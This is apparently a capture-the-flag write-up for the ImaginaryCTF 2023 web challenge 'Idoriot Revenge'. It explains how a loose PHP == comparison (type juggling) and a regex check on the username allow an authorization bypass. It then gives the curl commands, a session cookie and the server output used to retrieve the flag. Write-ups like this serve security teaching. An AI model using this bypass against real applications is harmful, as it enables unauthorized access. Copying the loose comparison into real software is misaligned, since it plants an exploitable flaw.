# Idoriot Revenge

## Description

by `tirefire`

The idiot who made it, made it so bad that the first version was super easy. It was changed to fix it.

**Attachments**: [http://idoriot-revenge.chal.imaginaryctf.org](http://idoriot-revenge.chal.imaginaryctf.org/)

## Solution

Same as [Idoriot]({% post_url CTFs/imaginaryCTF/2023/2023-07-23-Idoriot %}), we register and get source code.

```php
// Check user_id
if (isset($_GET['user_id'])) {
    $user_id = (int) $_GET['user_id'];
    // Check if the user is admin
    if ($user_id == "php" && preg_match("/".$admin['username']."/", $_SESSION['username'])) {
        // Read the flag from flag.txt
        $flag = file_get_contents('/flag.txt');
        echo "<h1>Flag</h1>";
        echo "<p>$flag</p>";
    }
}
```

1. We just need to create a user where `admin` word is inside.
2. `$user_id == "php"` user_id is int and `int == str` becomes `int == (int) str`. This is because [php type juggling](https://www.php.net/manual/en/language.types.type-juggling.php) (`==` is not safe for exact comparision, `===` should be used). In this case `(int) str` becomes 0, so we need `user_id` to be 0.

Let's do it with `cUrl`:

```powershell
# "-sS -D -": To get headers (Post and Header request can't be set at the same time)
# "-X POST": Send post request to register
# "-d": Send post form data
➜ curl -sS -D - -X POST http://idoriot-revenge.chal.imaginaryctf.org/register.php -d "username=adminUwU&password=anything"
HTTP/1.1 302 Found
Date: Sun, 23 Jul 2023 14:56:04 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=ece69f5911ff1b59d01be00b81fbc9ce; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php?user_id=729879799
Content-Length: 0
Content-Type: text/html; charset=UTF-8

# Add `?user_id=0` to update user_id to 0
# "-b": Send cookie. PHPSESSID is identifier of user so that's why we requested Headers before
# "-s": To not display progress bar
# "Select-String ictf": `grep` like tool, but in powershell.
➜ curl http://idoriot-revenge.chal.imaginaryctf.org/?user_id=0 -b "PHPSESSID=ece69f5911ff1b59d01be00b81fbc9ce;" -s | Select-String ictf

Welcome, User ID: 729879799<h1>Flag</h1><p>ictf{this_ch4lleng3_creator_1s_really_an_idoriot}</p><h1>Source Code
</h1><code><span style="color: #000000">
```
::: tip Flag
`ictf{this_ch4lleng3_creator_1s_really_an_idoriot}`
:::